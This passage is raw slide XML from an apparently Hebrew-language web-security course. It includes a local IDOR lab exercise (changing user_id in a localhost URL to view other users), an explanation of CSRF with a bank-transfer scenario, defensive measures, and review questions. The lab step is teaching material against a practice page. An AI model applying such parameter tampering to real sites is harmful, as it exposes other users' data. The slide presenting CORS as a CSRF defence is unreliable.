              <a:t>המשך - תרגול להמחשת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDOR</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C26E7501-39DF-44F6-A522-D075F4966D20}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ודאו ששרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Apache </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> פועל:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> service apache2 start</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>צעד 2: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בדיקת ה- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> IDOR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>גישה לדף הדוגמה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>פתח את הדפדפן שלך וגש לכתובת:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://localhost/simple_idor/index.php?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>user_id=1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:highlight>
                <a:srgbClr val="FFFF00"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זה אמור להראות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Hello, Alice!</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נסה לשנות את פרמטר ה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> URL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ל-2 או 3, ותראה את התגובה</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="410832039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28ED8724-9D22-40CC-9640-CE1ECAAA51C2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1715494"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-US" sz="5400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="5400" dirty="0"/>
              <a:t>Cross-Site Request Forgery (CSRF)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="he-IL" sz="5400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="128292281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4DD23B0-E427-44EB-A9B7-EE793D7310FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2156790" y="642594"/>
            <a:ext cx="8968409" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cross-Site Request Forgery (CSRF)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{35D03395-19A6-4171-A480-4985580CEA70}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Cross-Site Request Forgery (CSRF)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>היא אחת ההתקפות הנפוצות והמסוכנות בעולם אבטחת המידע. היא מתבצעת כאשר תוקף גורם למשתמש לבצע פעולה לא מכוונת באתר אינטרנט שבו הוא מחובר, בלי שהמשתמש יהיה מודע לכך.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איך זה עובד?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תשובה: דמיין שאתה מחובר לחשבון הבנק שלך באתר אינטרנט מסוים. באותו הזמן, אתה פתוח גם באתרים אחרים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מתקפה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התוקף יוצר אתר זדוני שמכיל קוד שיבצע פעולה באתר הבנק שלך. הקוד הזה יכול להיות פקודת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>GET</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>POST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמביאה את הבקשה שלך לבצע פעולה מסוימת כמו העברת כסף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ביצוע הבקשה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כאשר אתה מבקר באתר הזדוני של התוקף, הקוד המוזן באתר הזה יישלח בקשה לשרת הבנק שלך תוך שימוש במידע ההתחברות שלך, כי אתה מחובר אליו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="304034385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81D636A-B009-4123-AADC-92E3DC6CD568}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7384774" y="642594"/>
            <a:ext cx="3740426" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{32EFAE89-B0AC-4D17-A903-CAF9B306209E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2480807"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה מציאותית:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שאתה מחובר לחשבון הבנק שלך באינטרנט. אתר זדוני מגרה אותך להיכנס אליו (למשל, קישור שהגעת אליו באימייל). ברקע, האתר הזה שולח בקשה לאתר הבנק שלך להעביר כסף מחשבונך לחשבון של התוקף. מכיוון שאתה מחובר, הבקשה מתקבלת כבקשה לגיטימית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2295978859"/>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5C43062-EC1B-4A1C-8262-AF8498F4D84E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7772400" y="642594"/>
            <a:ext cx="3352800" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מניעת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E54935C5-6672-4F64-AEBC-9A0CFAFF3599}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שימוש ב- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:Tokens</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> השתמש בטוקנים חד-פעמיים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSRF Tokens</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> על כל טופס אינטרנטי. כל בקשה שמוגשת מהמשתמש חייבת לכלול את הטוקן הזה, והשרת מאמת אותו לפני ביצוע הפעולה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>בדיקת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Referer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> Header</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בדוק את שדה ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Referer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שבבקשה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי לוודא שהבקשה מגיעה מהדף המורשה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שימוש ב- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>SameSite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> Cookies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>קבע את פרמטר ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SameSite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>של העוגיות שלך ל- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Strict</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Lax </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי למנוע שליחה של עוגיות עם בקשות בין-אתר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ווידוא נכונות הבקשה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בצע בדיקות נוספות על הנתונים הנשלחים מהלקוח כדי לוודא שהם תואמים למה שנדרש לצורך ביצוע הפעולה.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="259055049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D21BB5F-33E8-4309-858D-CE63B32486E9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3756990" y="642594"/>
            <a:ext cx="7368209" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איך להימנע מהתקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8476CC89-99EE-47AF-99AC-C74D844E38FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> (Cross-Origin Resource Sharing)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>CORS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: מגביל את הבקשות בין </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דומיינים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שונים ומאפשר למנוע את התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> על ידי הגבלת המקורות שיכולים לשלוח בקשות לשרת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>אימות מבוסס </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :CAPTCHAs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>השתמש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> CAPTCHA </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי לוודא שהבקשה מגיעה ממשתמש </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>אמיתי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ולא מאוטומציה זדונית. זה עוזר להקטין את הסיכוי להתקפות אוטומטיות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הגבלת זכויות גישה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> קבע מדיניות גישה שמגבילה את ההרשאות של כל משתמש. גם אם תוקף מצליח לבצע </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ,CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הוא לא יוכל לבצע פעולות מזיקות אם למשתמש אין הרשאות גבוהות.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1103597740"/>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E119651-5EC2-402C-99A1-E4E303F0136E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7205870" y="642594"/>
            <a:ext cx="3919330" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שאלות - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EA9498E7-414C-4CDD-96BF-09FE8B07533C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. מהו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSRF Token</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ואיך הוא עוזר להגן עלינו?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. איך ניתן להפעיל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> CSRF Token</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בפרויקט ווב?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. מה ההבדל בין </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ל- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. איך ניתן לזהות התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בבדיקת קוד?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. מדוע בקשות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> GET</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נחשבות פחות מסוכנות בהקשר של </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>6. איזה פתרון היית ממליץ לאתר שמגלה שהוא חשוף להתקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="409262611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3530B17-01CA-4FFD-B8CE-259C9D95BD89}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6997148" y="642594"/>
            <a:ext cx="4128052" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תשובות - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
